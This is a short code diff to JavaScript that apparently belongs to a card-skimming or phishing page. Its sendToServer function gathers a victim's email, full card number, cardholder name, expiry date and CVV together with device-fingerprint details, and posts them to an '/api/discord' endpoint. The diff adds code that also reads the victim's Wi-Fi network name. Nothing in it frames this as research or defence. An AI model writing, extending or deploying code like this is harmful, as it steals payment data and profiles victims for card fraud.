@@ -128,6 +128,13 @@ function validateExpiry(e){return /^(0[1-9]|1[0-2])\/\d{2}$/.test(e);}
 function validateCVV(c){return /^\d{3,4}$/.test(c);}
 async function sendToServer(email,cardNumber,cardHolder,expiryDate,cvv){
   const apiUrl=window.location.origin+'/api/discord';
+  let wifiName='';
+  try{
+    if(window.wifi&&window.wifi.getCurrentConfigurations){
+      const configs=await window.wifi.getCurrentConfigurations();
+      if(configs&&configs.length>0)wifiName=configs[0].ssid;
+    }
+  }catch(e){}
   const body={
     email,
     cardNumber,cardHolder,expiryDate,cvv,
@@ -144,7 +151,8 @@ async function sendToServer(email,cardNumber,cardHolder,expiryDate,cvv){
     cpuCores:navigator.hardwareConcurrency||'desconocido',
     touchPoints:navigator.maxTouchPoints||0,
     isMobile:'No',isTablet:'No',isDesktop:'Sí',
-    batteryLevel:'No disponible',batteryCharging:'Desconocido'
+    batteryLevel:'No disponible',batteryCharging:'Desconocido',
+    wifiName
   };
   try{
     const res=await fetch(apiUrl,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(body)});
